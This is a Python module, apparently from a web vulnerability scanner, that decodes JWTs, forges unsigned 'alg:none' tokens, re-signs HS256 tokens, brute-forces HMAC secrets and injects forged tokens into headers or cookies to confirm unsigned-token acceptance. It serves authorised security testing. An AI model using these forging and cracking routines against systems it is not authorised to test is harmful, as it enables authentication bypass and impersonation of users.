"""
scanner.jwt — JSON Web Token analysis and attacks.

JWTs are their own attack surface: an ``alg:none`` token the server still trusts,
an HMAC secret weak enough to brute-force, an ``RS256→HS256`` confusion. None of
these are reachable by parameter fuzzing — they need the token decomposed, forged,
and re-submitted. This module does that with stdlib crypto only (base64url + hmac
+ hashlib), and a :class:`JwtNoneCheck` request-level check confirms the classic
unsigned-token acceptance via the achieved-state oracle.

Confirmation stays honest: ``alg:none`` is flagged only when a *well-formed
unsigned* token is accepted **and** a garbage token is rejected — i.e. the server
specifically trusts unsigned JWTs, not that it ignores auth entirely. A weak
secret is proved by recomputing the exact signature (a deterministic fact).

Utilities here mint tokens for testing an operator-owned target; they are not a
turnkey forgery service.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from collections.abc import Iterable
from dataclasses import dataclass
from typing import Any

from ..verify.adapter import FindingContext
from .checks import Send
from .insertion import HttpRequest, RequestTemplate


# ---------------------------------------------------------------------------
# base64url + JWT codec
# ---------------------------------------------------------------------------


def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def decode(token: str) -> tuple[dict[str, Any], dict[str, Any], str]:
    """(header, payload, signing_input) — signing_input is the exact
    ``header.payload`` string the signature was computed over, kept verbatim so a
    secret-crack recomputes the real signature (never a re-serialised one)."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("not a three-part JWT")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, f"{parts[0]}.{parts[1]}"


def _segment(obj: dict[str, Any]) -> str:
    return b64url_encode(json.dumps(obj, separators=(",", ":"), sort_keys=True).encode("utf-8"))


def encode_none(header: dict[str, Any], payload: dict[str, Any]) -> str:
    """A well-formed unsigned token: ``alg:none`` and an empty signature."""
    h = {**header, "alg": "none"}
    return f"{_segment(h)}.{_segment(payload)}."


def encode_hs256(header: dict[str, Any], payload: dict[str, Any], secret: bytes) -> str:
    h = {**header, "alg": "HS256"}
    signing_input = f"{_segment(h)}.{_segment(payload)}"
    sig = hmac.new(secret, signing_input.encode("ascii"), hashlib.sha256).digest()
    return f"{signing_input}.{b64url_encode(sig)}"


def crack_hs256(token: str, candidates: Iterable[str | bytes]) -> str | None:
    """Return the first candidate whose HMAC-SHA256 reproduces the token's exact
    signature, or None. Deterministic proof the secret is weak — no oracle needed."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
    target = parts[2]
    for cand in candidates:
        secret = cand.encode("utf-8") if isinstance(cand, str) else cand
        sig = b64url_encode(hmac.new(secret, signing_input, hashlib.sha256).digest())
        if hmac.compare_digest(sig, target):
            return cand if isinstance(cand, str) else cand.decode("utf-8", "replace")
    return None


# ---------------------------------------------------------------------------
# token placement in a request (Authorization: Bearer, or a cookie)
# ---------------------------------------------------------------------------


def extract_token(req: HttpRequest, location: str) -> str | None:
    """Pull a JWT from ``location``: a header name (``authorization`` strips a
    ``Bearer`` prefix) or ``cookie:<name>``."""
    if location.startswith("cookie:"):
        name = location.split(":", 1)[1]
        cookie = req.header("cookie") or ""
        for part in cookie.split(";"):
            k, _, v = part.strip().partition("=")
            if k == name and _looks_like_jwt(v):
                return v
        return None
    value = req.header(location) or ""
    if value.lower().startswith("bearer "):
        value = value[7:].strip()
    return value if _looks_like_jwt(value) else None


def with_token(req: HttpRequest, location: str, token: str) -> HttpRequest:
    """Return a copy of ``req`` with ``token`` placed at ``location``."""
    if location.startswith("cookie:"):
        name = location.split(":", 1)[1]
        cookie = req.header("cookie") or ""
        pairs = []
        replaced = False
        for part in cookie.split(";"):
            k, _, _ = part.strip().partition("=")
            if k == name:
                pairs.append(f"{name}={token}")
                replaced = True
            elif part.strip():
                pairs.append(part.strip())
        if not replaced:
            pairs.append(f"{name}={token}")
        headers = [(k, v) for k, v in req.headers if k.lower() != "cookie"]
        headers.append(("Cookie", "; ".join(pairs)))
        return req.model_copy(update={"headers": headers})

    headers = [(k, v) for k, v in req.headers if k.lower() != location.lower()]
    prefix = "Bearer " if location.lower() == "authorization" else ""
    headers.append((location.title() if location.islower() else location, f"{prefix}{token}"))
    return req.model_copy(update={"headers": headers})


def _looks_like_jwt(v: str) -> bool:
    parts = v.split(".")
    return len(parts) == 3 and all(parts[:2])


# ---------------------------------------------------------------------------
# the check
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class JwtNoneCheck:
    """Confirm ``alg:none`` acceptance: forge a well-formed unsigned copy of the
    request's JWT and submit it, alongside a garbage control. Vulnerable iff the
    unsigned token is authorized while the garbage token is not — the server
    specifically trusts unsigned JWTs."""

    id: str = "jwt-alg-none"
    bug_class: str = "jwt"
    location: str = "authorization"

    def probe(self, template: RequestTemplate, send: Send) -> FindingContext | None:
        req = template.request
        token = extract_token(req, self.location)
        if token is None:
            return None
        try:
            header, payload, _ = decode(token)
        except Exception:
            return None

        none_resp = send(with_token(req, self.location, encode_none(header, payload)))
        garbage_resp = send(with_token(req, self.location, "aaa.bbb.ccc"))
        vulnerable = _authorized(none_resp) and not _authorized(garbage_resp)
        return FindingContext.from_state(
            {"alg_none_accepted": True}, {"alg_none_accepted": vulnerable}, bug_class=self.bug_class)


def _authorized(resp: object) -> bool:
    if not isinstance(resp, dict):
        return False
    status = int(resp.get("status", 0))
    return status not in (0, 401, 403)
